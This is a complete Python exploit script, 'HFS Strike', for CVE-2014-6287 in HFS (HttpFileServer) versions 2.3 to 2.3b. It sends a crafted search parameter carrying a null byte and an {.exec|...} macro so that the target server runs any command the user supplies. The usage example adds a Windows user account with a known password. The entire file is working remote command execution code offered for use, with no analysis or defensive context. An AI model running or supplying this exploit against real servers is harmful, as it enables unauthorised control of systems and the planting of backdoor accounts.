import urllib.request, urllib.parse, urllib.error
import sys

def parse_args(args):
    help_text = """
----------Description----------
HFS Strike: CVE-2014-6287 Exploitation
by xyzzklk
2.3 <= Target HFS Version <= 2.3b
-----------Usage----------
python filename.py [options]
Options:
-t Target url
-c Payload command string
Example:
~ $ python hfs_strike.py -t http://192.168.1.185/ -c "net user /add Admin 123456"
"""
    args = args[1:]
    if len(args) == 0 or len(args) != 4:
        print(help_text)
        exit()
        
    target_url = args[args.index("-t")+1]
    cmd_str = args[args.index("-c")+1]
    if not target_url.endswith("/"):
        target_url += "/"
    return target_url, cmd_str
  
def exploit(target_url, cmd_str):
    cmd_str = urllib.parse.quote(cmd_str, safe="/\:<|>%", encoding="UTF-8")
    evil_url = target_url + "?search==%00{.exec|" + cmd_str + ".}"
    print("Exploit url:", evil_url)
    rsp = urllib.request.urlopen(evil_url)
    
target_url, cmd_str = parse_args(sys.argv)
try:
    exploit(target_url, cmd_str)
except Exception as e:
    print(e)